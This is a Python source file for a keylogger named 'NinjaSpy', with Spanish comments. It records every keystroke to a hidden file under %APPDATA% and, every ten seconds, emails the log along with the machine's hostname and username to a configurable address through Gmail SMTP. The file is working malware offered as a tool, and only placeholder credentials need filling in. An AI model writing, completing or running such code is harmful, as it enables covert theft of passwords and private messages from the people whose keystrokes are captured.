from pynput.keyboard import Listener, Key
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from smtplib import SMTP
import sys
import time
import os
import socket
import getpass
import threading

# Constantes
FROM_EMAIL = "tucorreo@gmail.com"  # Cambia esto a tu correo electrónico
TO_EMAIL = "destinatario@yopmail.com"  # Cambia esto al correo de destino
APP_CODE = "tu codigo de aplicacion"  # Cambia esto a tu código de aplicación
LOG_FILE_NAME = "log.txt"
LOG_FILE_DIR = os.path.expandvars(r"%APPDATA%\NinjaSpy")
LOG_FILE_PATH = os.path.join(LOG_FILE_DIR, LOG_FILE_NAME)
INTERVALO_ENVIO_CORREO = 10  # En segundos

# Diccionario para teclas especiales
SPECIAL_KEYS = {
    Key.space: ' ',
    Key.enter: '\n',
    Key.shift: '',
    Key.delete: ' ',
    Key.backspace: ' ',
    Key.ctrl_l: '[CTRL]',
    Key.ctrl_r: '[CTRL]',
    Key.alt_l: '[ALT]',
    Key.alt_r: '[ALT]',
    Key.caps_lock: '[CAPSLOCK]',
    Key.tab: '[TAB]',
    Key.f12: 'EXIT'
}

# Variable global para el tiempo del último envío de correo
ultimo_envio_correo = time.time()

def obtener_informacion_sistema():
    """
    Obtiene información del sistema como el nombre del host y el nombre del usuario.
    """
    hostname = socket.gethostname()
    username = getpass.getuser()
    return hostname, username

def keyboard_listener(key):
    """
    Escucha las teclas presionadas y las registra en un archivo.
    """
    try:
        letra = ''
        if key in SPECIAL_KEYS:
            letra = SPECIAL_KEYS[key]
        elif hasattr(key, 'char') and key.char:
            letra = key.char
        else:
            letra = str(key).replace("'", "")
        
        with open(LOG_FILE_PATH, 'a') as f:
            f.write(letra)
    except Exception as e:
        print("Error en keyboard_listener:", e)

def send_email():
    """
    Envía el archivo de registro por correo electrónico.
    """
    try:
        hostname, username = obtener_informacion_sistema()

        mensaje = MIMEMultipart("plain")
        mensaje["From"] = FROM_EMAIL
        mensaje["To"] = TO_EMAIL
        mensaje["Subject"] = f"NinjaSpy / {hostname} / {username}"

        adjunto = MIMEBase("application", "octet-stream")
        with open(LOG_FILE_PATH, "rb") as archivo:
            adjunto.set_payload(archivo.read())
        encoders.encode_base64(adjunto)
        adjunto.add_header("Content-Disposition", f'attachment; filename="{LOG_FILE_NAME}"')
        mensaje.attach(adjunto)

        with SMTP("smtp.gmail.com", 587) as servidor:
            servidor.starttls()
            servidor.login(FROM_EMAIL, APP_CODE)
            servidor.sendmail(FROM_EMAIL, TO_EMAIL, mensaje.as_string())
            
        print("(+) Correo electrónico enviado (automáticamente).")
    except Exception as e:
        print("Error al enviar correo:", e)

def enviar_correo_automaticamente():
    """
    Envía correos automáticamente en intervalos definidos.
    """
    global ultimo_envio_correo
    while True:
        tiempo_actual = time.time()
        if tiempo_actual - ultimo_envio_correo >= INTERVALO_ENVIO_CORREO:
            send_email()
            ultimo_envio_correo = tiempo_actual
        time.sleep(1)

def main():
    """
    Función principal que inicia el proceso del keylogger.
    """
    print('(+) Iniciando proceso...')
    
    # Crear el directorio si no existe
    os.makedirs(LOG_FILE_DIR, exist_ok=True)
    
    # Iniciar hilo para envío automático de correos
    correo_thread = threading.Thread(target=enviar_correo_automaticamente)
    correo_thread.daemon = True  
    correo_thread.start()
    
    # Iniciar escucha de teclado
    with Listener(on_press=keyboard_listener) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("(-) Keylogger detenido manualmente.")

if __name__ == '__main__':
    # Nombre del proyecto
    tool_name = """
    888888ba  oo          oo          .d88888b                     
    88    `8b                         88.    "'                    
    88     88 dP 88d888b. dP .d8888b. `Y88888b.  88d888b. dP    dP 
    88     88 88 88'  `88 88 88'  `88       `8b  88'  `88 88    88 
    88     88 88 88    88 88 88.  .88 d8'   .8P  88.  .88 88.  .88 
    dP     dP dP dP    dP 88 `88888P8  Y88888P   88Y888P' `8888P88 
    oooooooooooooooooooooo88~ooooooooooooooooooo~88~ooooooo~~~~.88~
                          dP  Creador: SebasDev  dP        d8888P 
    """
    print(tool_name)
    try:
        main()
    except Exception as e:
        print("Error:", e)
        sys.exit(1)
